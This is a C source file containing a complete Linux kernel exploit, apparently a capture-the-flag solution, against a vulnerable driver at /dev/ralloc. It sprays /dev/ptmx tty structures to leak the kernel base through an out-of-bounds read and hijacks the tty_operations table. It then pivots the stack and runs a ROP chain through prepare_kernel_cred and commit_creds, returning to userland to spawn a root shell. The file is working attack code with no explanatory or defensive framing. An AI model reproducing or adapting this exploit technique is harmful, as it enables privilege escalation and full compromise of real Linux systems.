#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define ALLOC 0x1000
#define FREE  0x1001
#define WRITE 0x1002
#define READ  0x1003

int fd, ptmx;

typedef struct {
    uint64_t index;
    uint64_t size;
    void* data;
} ralloc_user;

void alloc_chunk(uint64_t index, uint64_t size) {
    ralloc_user args = { index, size };
    ioctl(fd, ALLOC, &args);
}

void free_chunk(uint64_t index) {
    ralloc_user args = { index };
    ioctl(fd, FREE, &args);
}

void write_chunk(uint64_t index, uint64_t size, void *data) {
    ralloc_user args = { index, size, data };
    ioctl(fd, WRITE, &args);
}

void read_chunk(uint64_t index, uint64_t size, void *data) {
    ralloc_user args = { index, size, data };
    ioctl(fd, READ, &args);
}

void shell() {
    system("/bin/sh");
    exit(0);
}

int main() {
    int i;
    uint64_t kernel_base;

    uint64_t *output = malloc(0x420);
    uint64_t *tty_operations = malloc(0x48);

    fd = open("/dev/ralloc", O_RDONLY);

    for (i = 0; i < 0x20; i++) {
        free_chunk(i);
    }

    for (i = 0; i < 0x20; i++) {
        alloc_chunk(i, 0x400);
        ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

        read_chunk(i, 0x420, output);

        if ((output[0x80] & 0xffffffff) == 0x5401 && (output[0x83] & 0xfff) == 0x6a0) {
            kernel_base = output[0x83] - 0x10af6a0;
            break;
        }

        close(ptmx);
    }

    tty_operations[4] = kernel_base + 0x368c08; // xchg esp, eax; ret;
    output[0x83] = (uint64_t) tty_operations;
    write_chunk(i, 0x420, output);

    uint64_t stack = (kernel_base + 0x368c08) & 0xffffffff; // xchg esp, eax; ret;
    uint64_t *payload = (uint64_t *) stack;

    mmap((void *) (stack & 0xfffff000), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    *payload++ = kernel_base + 0x0001cc; // ret;
    *payload++ = kernel_base + 0x08b8a0; // pop rdi; ret,
    *payload++ = 0x0;                    // 0x0
    *payload++ = kernel_base + 0x0c07a0; // prepare_kernel_cred
    *payload++ = kernel_base + 0x405ea6; // pop rcx; ret;
    *payload++ = 0x0;                    // 0x0
    *payload++ = kernel_base + 0x1440be; // pop rsi; ret;
    *payload++ = 0x0;                    // padding for pop
    *payload++ = kernel_base + 0x4ed7ea; // mov rdi, rax; cmp rcx, rsi; ja 0xffffffff814ed7dd; pop rbp; ret;
    *payload++ = 0x0;                    // rbp value
    *payload++ = kernel_base + 0x0c0540; // commit_creds
    *payload++ = kernel_base + 0x074b54; // swapgs; pop rbp; ret;
    *payload++ = 0x0;                    // padding for pop
    *payload++ = kernel_base + 0x405ea6; // pop rcx; ret;
    *payload++ = (uint64_t) &shell;      // shell()
    *payload++ = kernel_base + 0x54c2d5; // pop r11; ret;
    *payload++ = 0x0;                    // 0x0
    *payload++ = kernel_base + 0x075444; // sysretq;

    close(ptmx);

    puts("[-] Exploit failed, try again!");

    return 0;
}
